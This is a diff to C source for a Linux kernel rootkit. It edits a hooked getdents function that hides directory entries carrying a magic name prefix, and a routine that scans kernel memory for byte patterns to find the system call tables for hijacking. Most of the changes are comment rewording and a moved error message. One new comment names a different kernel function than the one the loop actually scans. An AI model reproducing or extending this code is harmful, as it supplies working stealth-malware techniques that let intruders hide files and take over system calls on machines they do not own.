@@ -66,11 +66,10 @@ asmlinkage long fake_getdents(struct pt_regs *regs) {
     j = 0;
     while (j < MAGIC_PREFIX_LEN && dirent->d_name[j] != '\0' && dirent->d_name[j] == MAGIC_PREFIX[j])
       j++;
-    
+
     /* hide directory entry */
+    /* exception for the first entry, swap it with the second entry */
     if (j == MAGIC_PREFIX_LEN) {
-      
-      /* swap first and second structures */
       if (last_d_reclen == 0) {
 	buffer_dirent = kmalloc(d_reclen, GFP_KERNEL);
 	if (!buffer_dirent) {
@@ -126,7 +125,7 @@ static void search_sys_call_table(void) {
   unsigned char pattern_1[] = {0x48, 0x19, 0xc0, 0x48, 0x21, 0xc7, 0x48};
   unsigned char pattern_2[] = {0xd2, 0x21, 0xd0, 0x48, 0x89, 0xef, 0x48};
 
-  /* fetch pattern_0 for call to do_syscall_64 function */
+  /* look for pattern_0 in entry_SYSCALL_64 for call to do_syscall_64 */
   for (i = 0; i < SEARCH_RANGE; i++) {
     j = 0;
     while (j < PATTERN_SIZE && entry_SYSCALL_64[i + j] == pattern_0[j])
@@ -144,7 +143,7 @@ static void search_sys_call_table(void) {
     return;
   }
 
-  /* fetch pattern_1 for offset of sys_call_table */
+  /* look for pattern_1 in do_syscall_64 for sys_call_table offset */
   for (i = 0; i < SEARCH_RANGE; i++) {
     j = 0;
     while (j < PATTERN_SIZE && do_syscall_64[i + j] == pattern_1[j])
@@ -156,8 +155,11 @@ static void search_sys_call_table(void) {
       break;
     } 
   }
+  
+  if (!sys_call_table)
+    printk(KERN_INFO "failed to find sys_call_table address");
 
-  /* fetch pattern_2 for offset of ia32_sys_call_table */
+  /* look for pattern_2 in do_syscall_32_irqs_on for ia32_sys_call_table offset */
   for ( ; i < SEARCH_RANGE; i++) {
     j = 0;
     while (j < PATTERN_SIZE && do_syscall_64[i + j] == pattern_2[j])
@@ -168,9 +170,6 @@ static void search_sys_call_table(void) {
       ia32_sys_call_table = (void **)(*ia32_sys_call_table_offset);
     }
   }
-
-  if (!sys_call_table)
-    printk(KERN_INFO "failed to find sys_call_table address");
 
   if (!ia32_sys_call_table)
     printk(KERN_INFO "failed to find ia32_sys_call_table address");
